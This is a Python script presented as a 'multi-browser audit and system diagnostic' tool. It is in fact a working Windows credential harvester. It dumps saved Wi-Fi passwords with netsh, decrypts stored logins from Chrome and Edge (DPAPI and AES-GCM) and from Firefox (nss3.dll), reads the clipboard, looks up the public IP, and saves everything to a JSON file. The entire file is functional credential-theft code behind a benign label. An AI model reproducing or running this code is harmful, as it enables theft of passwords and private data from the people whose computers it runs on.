import os
import json
import base64
import shutil
import sqlite3
import platform
import socket
import re
import uuid
import requests
import pyperclip
import subprocess
import sys
import ctypes
from datetime import datetime

# --- AUTOMATIC DEPENDENCY HANDLER ---
def check_requirements():
    try:
        from win32crypt import CryptUnprotectData
        from Crypto.Cipher import AES
        from colorama import Fore, Style, init
        init(autoreset=True)
    except ImportError:
        print("Missing libraries. Installing: pywin32, pycryptodome, colorama, pyperclip, requests...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32", "pycryptodome", "colorama", "pyperclip", "requests"])
        print("\n[+] Libraries installed successfully. Please restart the script.")
        sys.exit()

check_requirements()
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from colorama import Fore, Style, init

# --- PATH CONFIGURATION ---
CHROME_PATH = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data')
EDGE_PATH = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data')
FIREFOX_PATH = os.path.join(os.environ['APPDATA'], r'Mozilla\Firefox\Profiles')

# Firefox NSS Structure for ctypes
class SECItem(ctypes.Structure):
    _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_void_p), ('len', ctypes.c_uint)]

# --- WI-FI RECOVERY ---
def get_wifi_passwords():
    networks = []
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for name in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
                password = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                networks.append({"ssid": name, "pass": password[0] if password else "(No Password)"})
            except: continue
    except: pass
    return networks

# --- CHROMIUM ENGINE (Chrome/Edge) ---
def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except: return None

def decrypt_chromium(buff, key):
    try:
        if not buff or not key: return ""
        if buff.startswith(b'v10') or buff.startswith(b'v11'):
            iv, payload = buff[3:15], buff[15:]
            ciphertext, tag = payload[:-16], payload[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(ciphertext, tag).decode()
        return CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except: return "(Decryption Failed)"

# --- FIREFOX ENGINE (NSS3.DLL) ---
def decrypt_firefox(profile_path):
    results = []
    ff_dirs = [r"C:\Program Files\Mozilla Firefox", r"C:\Program Files (x86)\Mozilla Firefox"]
    ff_dir = next((d for d in ff_dirs if os.path.exists(d)), None)
    if not ff_dir or not os.path.exists(os.path.join(profile_path, "logins.json")): return results

    try:
        os.environ['PATH'] = ff_dir + os.pathsep + os.environ['PATH']
        nss = ctypes.CDLL(os.path.join(ff_dir, "nss3.dll"))
        if nss.NSS_Init(profile_path.encode('utf-8')) != 0: return results
        with open(os.path.join(profile_path, "logins.json"), 'r') as f:
            logins = json.load(f)
        for login in logins.get('logins', []):
            def nss_decrypt(data_str):
                data = base64.b64decode(data_str)
                item = SECItem(0, ctypes.cast(ctypes.create_string_buffer(data), ctypes.c_void_p), len(data))
                res = SECItem(0, None, 0)
                if nss.PK11SDR_Decrypt(ctypes.byref(item), ctypes.byref(res), None) == 0:
                    return ctypes.string_at(res.data, res.len).decode('utf-8')
                return "(Locked: Primary Password)"
            results.append({'browser': 'Firefox', 'url': login['hostname'], 'user': nss_decrypt(login['encryptedUsername']), 'pass': nss_decrypt(login['encryptedPassword'])})
        nss.NSS_Shutdown()
    except: pass
    return results

# --- EXTRACTION AGGREGATOR ---
def gather_all_data():
    all_creds = []
    # 1. Chromium Browsers
    for b_name, b_path in [("Chrome", CHROME_PATH), ("Edge", EDGE_PATH)]:
        if not os.path.exists(b_path): continue
        key = get_master_key(b_path)
        profiles = [d for d in os.listdir(b_path) if os.path.isdir(os.path.join(b_path, d)) and (d == 'Default' or d.startswith('Profile'))]
        for prof in profiles:
            db_path = os.path.join(b_path, prof, 'Login Data')
            if os.path.exists(db_path):
                tmp_db = f"tmp_{b_name}.db"
                shutil.copy2(db_path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                for url, user, pw in conn.execute('SELECT origin_url, username_value, password_value FROM logins'):
                    if user: all_creds.append({'browser': b_name, 'url': url, 'user': user, 'pass': decrypt_chromium(pw, key)})
                conn.close()
                os.remove(tmp_db)
    # 2. Firefox
    if os.path.exists(FIREFOX_PATH):
        for prof in os.listdir(FIREFOX_PATH):
            p_full = os.path.join(FIREFOX_PATH, prof)
            if os.path.isdir(p_full): all_creds.extend(decrypt_firefox(p_full))
    return all_creds

# --- MAIN EXECUTION ---
if __name__ == '__main__':
    print(f"{Fore.CYAN}{'='*90}\n{Fore.YELLOW}           MULTI-BROWSER AUDIT & SYSTEM DIAGNOSTIC REPORT\n{Fore.CYAN}{'='*90}")
    
    # 1. Sys Info
    print(f"{Fore.GREEN}[+] Hostname: {Fore.WHITE}{socket.gethostname()}")
    try: print(f"{Fore.GREEN}[+] Public IP: {Fore.WHITE}{requests.get('https://api.ipify.org', timeout=3).text}")
    except: pass

    # 2. Wi-Fi Recovery
    wifi = get_wifi_passwords()
    print(f"\n{Fore.YELLOW}[ SAVED WI-FI NETWORKS ]")
    for w in wifi: print(f"{Fore.WHITE}SSID: {w['ssid']:<25} | Password: {Fore.GREEN}{w['pass']}")

    # 3. Credentials
    print(f"\n{Fore.BLUE}[*] Auditing Browser Databases...")
    creds = gather_all_data()
    print(f"\n{Fore.CYAN}{'Browser':<10} | {'Username':<25} | {'Password':<25} | {'URL'}")
    print("-" * 100)
    for c in creds:
        p_color = Fore.RED if "Failed" in c['pass'] or "Locked" in c['pass'] else Fore.GREEN
        print(f"{c['browser']:<10} | {c['user']:<25} | {p_color}{c['pass']:<25}{Style.RESET_ALL} | {c['url'][:40]}")

    # 4. Save to JSON
    report_name = f"Audit_{datetime.now().strftime('%H%M%S')}.json"
    with open(report_name, 'w') as f:
        json.dump({"wifi": wifi, "creds": creds, "clipboard": pyperclip.paste()}, f, indent=4)
    print(f"\n{Fore.YELLOW}[*] Full audit saved to: {os.path.abspath(report_name)}")
    input("\nPress Enter to exit...")